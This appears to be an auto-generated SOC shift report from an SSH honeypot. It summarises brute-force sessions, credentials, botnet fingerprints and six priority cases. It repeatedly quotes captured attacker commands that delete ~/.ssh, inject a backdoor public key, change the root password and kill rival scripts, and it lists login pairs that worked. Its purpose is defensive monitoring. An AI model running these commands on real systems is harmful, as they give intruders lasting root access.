# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-17 |
| **Generated At** | 2026-06-17T15:42:12Z |
| **Shift Time** | 15:42 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **119** |
| Confirmed Threats | **103** |
| False Positives Filtered | **16** (13.5%) |
| Unique Attacker IPs | **62** |
| Countries of Origin | **18** |
| High Severity Cases | **6** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **113** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **30** |
| Unique Credential Pairs | **26** |
| Unique Usernames | **22** |
| Unique Passwords | **25** |
| Successful Auth Pairs | **6** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 6 |
| `345gs5662d34` | 4 |
| `debian` | 1 |
| `oracle` | 1 |
| `localadmin` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 4 |
| `123456` | 2 |
| `3245gs5662d34` | 2 |
| `123456789` | 1 |
| `oracle123` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 4 |
| `root` | `3245gs5662d34` | 2 |
| `debian` | `123456789` | 1 |
| `oracle` | `oracle123` | 1 |
| `localadmin` | `123456` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `98765` | `45.249.247.86` | 2026-06-17T12:56:44 |
| `root` | `123456QWE` | `103.187.26.126` | 2026-06-17T13:40:45 |
| `root` | `3245gs5662d34` | `103.187.26.126` | 2026-06-17T13:40:48 |
| `root` | `Az123456!` | `79.116.23.158` | 2026-06-17T14:38:02 |
| `root` | `3245gs5662d34` | `79.116.23.158` | 2026-06-17T14:38:06 |
| `root` | `Aa12345678@` | `43.164.192.40` | 2026-06-17T15:06:13 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **119** |
| Sessions with Fingerprint | **9** |
| Unique HASSH Fingerprints | **9** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 31 |
| OpenSSH | 6 |
| Go SSH scanner | 6 |
| Perl Net::SSH | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 26 | 10 |
| `acaa53e0a7d7...` | Mirai/variant | 5 | 5 |
| `e54ef3ec27fe...` | Generic scanner | 3 | 3 |
| `873a5fb5fedc...` | Mirai/variant | 1 | 1 |
| `bc9e7273cde2...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 26 | 10 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 5 | 5 | Mirai/variant |
| `95420f9d932d...` | libssh | 5 | 4 | — |
| `e54ef3ec27fe...` | Go SSH scanner | 3 | 3 | Generic scanner |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `bc9e7273cde2...` | OpenSSH | 1 | 1 | Mirai/variant |
| `3c0eaacec19b...` | Perl Net::SSH | 1 | 1 | Mirai/variant |
| `2aec6b44b06b...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:LISsrW12jzFH"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `43.164.192.40`, `45.249.247.86`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `79.116.23.158`, `103.187.26.126`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **62** |
| Unique ASNs | **44** |
| High-Risk ASNs | **37** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS16509` | Amazon.com, Inc. | 4 | HIGH |
| `AS46562` | Performive LLC | 4 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS8075` | Microsoft Corporation | 4 | HIGH |
| `AS45090` | Shenzhen Tencent Computer Systems Company Limited | 3 | HIGH |
| `AS31898` | Oracle Corporation | 2 | HIGH |
| `AS25369` | Hydra Communications Ltd | 2 | HIGH |
| `AS213412` | ONYPHE SAS | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (6)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-92192f76c745

| Field | Detail |
|---|---|
| **Source IP** | `45.249.247[.]86` |
| **First Seen** | 2026-06-17 12:56 |
| **Last Seen** | 2026-06-17 12:57 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:LISsrW12jzFH"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-17 12:56:43` | `cowrie.session.connect` |
| `2026-06-17 12:56:43` | `cowrie.client.version` |
| `2026-06-17 12:56:43` | `cowrie.client.kex` |
| `2026-06-17 12:56:44` | `cowrie.login.success` |
| `2026-06-17 12:56:44` | `cowrie.session.params` |
| `2026-06-17 12:56:44` | `cowrie.command.input` |
| `2026-06-17 12:56:44` | `cowrie.command.failed` |
| `2026-06-17 12:56:44` | `cowrie.log.closed` |
| `2026-06-17 12:56:44` | `cowrie.session.params` |
| `2026-06-17 12:56:44` | `cowrie.command.input` |
| `2026-06-17 12:56:44` | `cowrie.session.file_download` |
| `2026-06-17 12:56:44` | `cowrie.log.closed` |
| `2026-06-17 12:56:54` | `cowrie.session.params` |
| `2026-06-17 12:56:54` | `cowrie.command.input` |
| `2026-06-17 12:56:55` | `cowrie.log.closed` |
| `2026-06-17 12:56:55` | `cowrie.session.params` |
| `2026-06-17 12:56:55` | `cowrie.command.input` |
| `2026-06-17 12:56:55` | `cowrie.log.closed` |
| `2026-06-17 12:56:55` | `cowrie.session.params` |
| `2026-06-17 12:56:55` | `cowrie.command.input` |
| `2026-06-17 12:56:55` | `cowrie.session.file_download` |
| `2026-06-17 12:56:55` | `cowrie.log.closed` |
| `2026-06-17 12:56:55` | `cowrie.session.params` |
| `2026-06-17 12:56:55` | `cowrie.command.input` |
| `2026-06-17 12:56:56` | `cowrie.log.closed` |
| `2026-06-17 12:56:56` | `cowrie.session.params` |
| `2026-06-17 12:56:56` | `cowrie.command.input` |
| `2026-06-17 12:56:56` | `cowrie.log.closed` |
| `2026-06-17 12:56:56` | `cowrie.session.params` |
| `2026-06-17 12:56:56` | `cowrie.command.input` |
| `2026-06-17 12:56:56` | `cowrie.command.input` |
| `2026-06-17 12:56:56` | `cowrie.log.closed` |
| `2026-06-17 12:56:56` | `cowrie.session.params` |
| `2026-06-17 12:56:56` | `cowrie.command.input` |
| `2026-06-17 12:56:57` | `cowrie.log.closed` |
| `2026-06-17 12:56:57` | `cowrie.session.params` |
| `2026-06-17 12:56:57` | `cowrie.command.input` |
| `2026-06-17 12:56:57` | `cowrie.log.closed` |
| `2026-06-17 12:56:57` | `cowrie.session.params` |
| `2026-06-17 12:56:57` | `cowrie.command.input` |
| `2026-06-17 12:56:57` | `cowrie.log.closed` |
| `2026-06-17 12:56:57` | `cowrie.session.params` |
| `2026-06-17 12:56:57` | `cowrie.command.input` |
| `2026-06-17 12:56:58` | `cowrie.log.closed` |
| `2026-06-17 12:56:58` | `cowrie.session.params` |
| `2026-06-17 12:56:58` | `cowrie.command.input` |
| `2026-06-17 12:56:58` | `cowrie.log.closed` |
| `2026-06-17 12:56:58` | `cowrie.session.params` |
| `2026-06-17 12:56:58` | `cowrie.command.input` |
| `2026-06-17 12:56:58` | `cowrie.log.closed` |
| `2026-06-17 12:56:59` | `cowrie.session.params` |
| `2026-06-17 12:56:59` | `cowrie.command.input` |
| `2026-06-17 12:56:59` | `cowrie.log.closed` |
| `2026-06-17 12:56:59` | `cowrie.session.params` |
| `2026-06-17 12:56:59` | `cowrie.command.input` |
| `2026-06-17 12:56:59` | `cowrie.log.closed` |
| `2026-06-17 12:56:59` | `cowrie.session.params` |
| `2026-06-17 12:56:59` | `cowrie.command.input` |
| `2026-06-17 12:56:59` | `cowrie.log.closed` |
| `2026-06-17 12:57:00` | `cowrie.session.params` |
| `2026-06-17 12:57:00` | `cowrie.command.input` |
| `2026-06-17 12:57:00` | `cowrie.log.closed` |
| `2026-06-17 12:57:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.247[.]86` to AbuseIPDB if not already reported
- [ ] Block `45.249.247[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60296143d9e9

| Field | Detail |
|---|---|
| **Source IP** | `103.187.26[.]126` |
| **First Seen** | 2026-06-17 13:40 |
| **Last Seen** | 2026-06-17 13:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-17 13:40:45` | `cowrie.session.connect` |
| `2026-06-17 13:40:45` | `cowrie.client.version` |
| `2026-06-17 13:40:45` | `cowrie.client.kex` |
| `2026-06-17 13:40:45` | `cowrie.login.success` |
| `2026-06-17 13:40:45` | `cowrie.session.params` |
| `2026-06-17 13:40:45` | `cowrie.command.input` |
| `2026-06-17 13:40:45` | `cowrie.command.failed` |
| `2026-06-17 13:40:46` | `cowrie.log.closed` |
| `2026-06-17 13:40:46` | `cowrie.session.params` |
| `2026-06-17 13:40:46` | `cowrie.command.input` |
| `2026-06-17 13:40:46` | `cowrie.session.file_download` |
| `2026-06-17 13:40:46` | `cowrie.log.closed` |
| `2026-06-17 13:40:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.187.26[.]126` to AbuseIPDB if not already reported
- [ ] Block `103.187.26[.]126` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-370247d73165

| Field | Detail |
|---|---|
| **Source IP** | `103.187.26[.]126` |
| **First Seen** | 2026-06-17 13:40 |
| **Last Seen** | 2026-06-17 13:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-17 13:40:47` | `cowrie.session.connect` |
| `2026-06-17 13:40:47` | `cowrie.client.version` |
| `2026-06-17 13:40:47` | `cowrie.client.kex` |
| `2026-06-17 13:40:48` | `cowrie.login.success` |
| `2026-06-17 13:40:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.187.26[.]126` to AbuseIPDB if not already reported
- [ ] Block `103.187.26[.]126` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a1f59cbe141

| Field | Detail |
|---|---|
| **Source IP** | `79.116.23[.]158` |
| **First Seen** | 2026-06-17 14:38 |
| **Last Seen** | 2026-06-17 14:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-17 14:38:01` | `cowrie.session.connect` |
| `2026-06-17 14:38:01` | `cowrie.client.version` |
| `2026-06-17 14:38:01` | `cowrie.client.kex` |
| `2026-06-17 14:38:02` | `cowrie.login.success` |
| `2026-06-17 14:38:02` | `cowrie.session.params` |
| `2026-06-17 14:38:02` | `cowrie.command.input` |
| `2026-06-17 14:38:02` | `cowrie.command.failed` |
| `2026-06-17 14:38:02` | `cowrie.log.closed` |
| `2026-06-17 14:38:03` | `cowrie.session.params` |
| `2026-06-17 14:38:03` | `cowrie.command.input` |
| `2026-06-17 14:38:03` | `cowrie.session.file_download` |
| `2026-06-17 14:38:03` | `cowrie.log.closed` |
| `2026-06-17 14:38:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.116.23[.]158` to AbuseIPDB if not already reported
- [ ] Block `79.116.23[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccfbacc463c8

| Field | Detail |
|---|---|
| **Source IP** | `79.116.23[.]158` |
| **First Seen** | 2026-06-17 14:38 |
| **Last Seen** | 2026-06-17 14:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-17 14:38:05` | `cowrie.session.connect` |
| `2026-06-17 14:38:05` | `cowrie.client.version` |
| `2026-06-17 14:38:05` | `cowrie.client.kex` |
| `2026-06-17 14:38:06` | `cowrie.login.success` |
| `2026-06-17 14:38:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.116.23[.]158` to AbuseIPDB if not already reported
- [ ] Block `79.116.23[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-516cd6b04c1a

| Field | Detail |
|---|---|
| **Source IP** | `43.164.192[.]40` |
| **First Seen** | 2026-06-17 15:06 |
| **Last Seen** | 2026-06-17 15:06 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:CRcN7fdqWGDm"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-17 15:06:11` | `cowrie.session.connect` |
| `2026-06-17 15:06:11` | `cowrie.client.version` |
| `2026-06-17 15:06:12` | `cowrie.client.kex` |
| `2026-06-17 15:06:13` | `cowrie.login.success` |
| `2026-06-17 15:06:14` | `cowrie.session.params` |
| `2026-06-17 15:06:14` | `cowrie.command.input` |
| `2026-06-17 15:06:14` | `cowrie.command.failed` |
| `2026-06-17 15:06:15` | `cowrie.log.closed` |
| `2026-06-17 15:06:15` | `cowrie.session.params` |
| `2026-06-17 15:06:15` | `cowrie.command.input` |
| `2026-06-17 15:06:16` | `cowrie.session.file_download` |
| `2026-06-17 15:06:16` | `cowrie.log.closed` |
| `2026-06-17 15:06:28` | `cowrie.session.params` |
| `2026-06-17 15:06:28` | `cowrie.command.input` |
| `2026-06-17 15:06:28` | `cowrie.log.closed` |
| `2026-06-17 15:06:29` | `cowrie.session.params` |
| `2026-06-17 15:06:29` | `cowrie.command.input` |
| `2026-06-17 15:06:30` | `cowrie.log.closed` |
| `2026-06-17 15:06:30` | `cowrie.session.params` |
| `2026-06-17 15:06:30` | `cowrie.command.input` |
| `2026-06-17 15:06:30` | `cowrie.session.file_download` |
| `2026-06-17 15:06:30` | `cowrie.log.closed` |
| `2026-06-17 15:06:31` | `cowrie.session.params` |
| `2026-06-17 15:06:31` | `cowrie.command.input` |
| `2026-06-17 15:06:32` | `cowrie.log.closed` |
| `2026-06-17 15:06:32` | `cowrie.session.params` |
| `2026-06-17 15:06:32` | `cowrie.command.input` |
| `2026-06-17 15:06:33` | `cowrie.log.closed` |
| `2026-06-17 15:06:34` | `cowrie.session.params` |
| `2026-06-17 15:06:34` | `cowrie.command.input` |
| `2026-06-17 15:06:34` | `cowrie.command.input` |
| `2026-06-17 15:06:34` | `cowrie.log.closed` |
| `2026-06-17 15:06:35` | `cowrie.session.params` |
| `2026-06-17 15:06:35` | `cowrie.command.input` |
| `2026-06-17 15:06:36` | `cowrie.log.closed` |
| `2026-06-17 15:06:36` | `cowrie.session.params` |
| `2026-06-17 15:06:36` | `cowrie.command.input` |
| `2026-06-17 15:06:37` | `cowrie.log.closed` |
| `2026-06-17 15:06:37` | `cowrie.session.params` |
| `2026-06-17 15:06:37` | `cowrie.command.input` |
| `2026-06-17 15:06:38` | `cowrie.log.closed` |
| `2026-06-17 15:06:38` | `cowrie.session.params` |
| `2026-06-17 15:06:38` | `cowrie.command.input` |
| `2026-06-17 15:06:39` | `cowrie.log.closed` |
| `2026-06-17 15:06:40` | `cowrie.session.params` |
| `2026-06-17 15:06:40` | `cowrie.command.input` |
| `2026-06-17 15:06:40` | `cowrie.log.closed` |
| `2026-06-17 15:06:41` | `cowrie.session.params` |
| `2026-06-17 15:06:41` | `cowrie.command.input` |
| `2026-06-17 15:06:42` | `cowrie.log.closed` |
| `2026-06-17 15:06:42` | `cowrie.session.params` |
| `2026-06-17 15:06:42` | `cowrie.command.input` |
| `2026-06-17 15:06:43` | `cowrie.log.closed` |
| `2026-06-17 15:06:43` | `cowrie.session.params` |
| `2026-06-17 15:06:43` | `cowrie.command.input` |
| `2026-06-17 15:06:44` | `cowrie.log.closed` |
| `2026-06-17 15:06:44` | `cowrie.session.params` |
| `2026-06-17 15:06:44` | `cowrie.command.input` |
| `2026-06-17 15:06:45` | `cowrie.log.closed` |
| `2026-06-17 15:06:46` | `cowrie.session.params` |
| `2026-06-17 15:06:46` | `cowrie.command.input` |
| `2026-06-17 15:06:46` | `cowrie.log.closed` |
| `2026-06-17 15:06:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.192[.]40` to AbuseIPDB if not already reported
- [ ] Block `43.164.192[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `192.210.203[.]201` | **29** | 2026-06-17 12:15 | 2026-06-17 14:18 | 16m | 0 | `T1592` | 🟠 MEDIUM |
| `176.183.121[.]46` | **5** | 2026-06-17 12:20 | 2026-06-17 12:35 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `43.164.192[.]40` | **4** | 2026-06-17 13:47 | 2026-06-17 15:10 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `45.249.247[.]86` | **4** | 2026-06-17 11:30 | 2026-06-17 12:56 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `157.230.150[.]187` | **3** | 2026-06-17 14:41 | 2026-06-17 14:41 | 1m | 0 | `T1592` | 🟢 LOW |
| `3.17.73[.]23` | **3** | 2026-06-17 12:10 | 2026-06-17 12:10 | 0m | 0 | `T1592` | 🟢 LOW |
| `13.89.125[.]21` | **2** | 2026-06-17 15:22 | 2026-06-17 15:22 | 0m | 0 | `T1592` | 🟢 LOW |
| `202.117.56[.]252` | **2** | 2026-06-17 11:13 | 2026-06-17 12:32 | 1m | 0 | `T1592` | 🟢 LOW |
| `3.130.168[.]2` | **2** | 2026-06-17 12:34 | 2026-06-17 12:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.131.220[.]121` | **2** | 2026-06-17 13:33 | 2026-06-17 13:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.134.216[.]108` | **2** | 2026-06-17 12:52 | 2026-06-17 12:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `4.227.180[.]232` | **2** | 2026-06-17 15:07 | 2026-06-17 15:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `94.231.206[.]200` | **2** | 2026-06-17 13:56 | 2026-06-17 13:56 | 0m | 0 | `T1592` | 🟢 LOW |
| `1.14.192[.]95` | 1 | 2026-06-17 12:58 | 2026-06-17 12:58 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.153.4[.]104` | 1 | 2026-06-17 11:40 | 2026-06-17 11:40 | 30s | 0 | `T1592` | 🟢 LOW |
| `103.187.26[.]126` | 1 | 2026-06-17 13:40 | 2026-06-17 13:40 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `104.152.52[.]128` | 1 | 2026-06-17 15:23 | 2026-06-17 15:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `106.13.228[.]234` | 1 | 2026-06-17 14:39 | 2026-06-17 14:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `111.70.9[.]143` | 1 | 2026-06-17 14:48 | 2026-06-17 14:48 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.6.11[.]184` | 1 | 2026-06-17 11:48 | 2026-06-17 11:48 | 16s | 0 | `T1592` | 🟢 LOW |
| `119.45.155[.]29` | 1 | 2026-06-17 15:32 | 2026-06-17 15:32 | 30s | 0 | `T1592` | 🟢 LOW |
| `12.68.228[.]244` | 1 | 2026-06-17 12:50 | 2026-06-17 12:50 | 0s | 0 | `T1592` | 🟢 LOW |
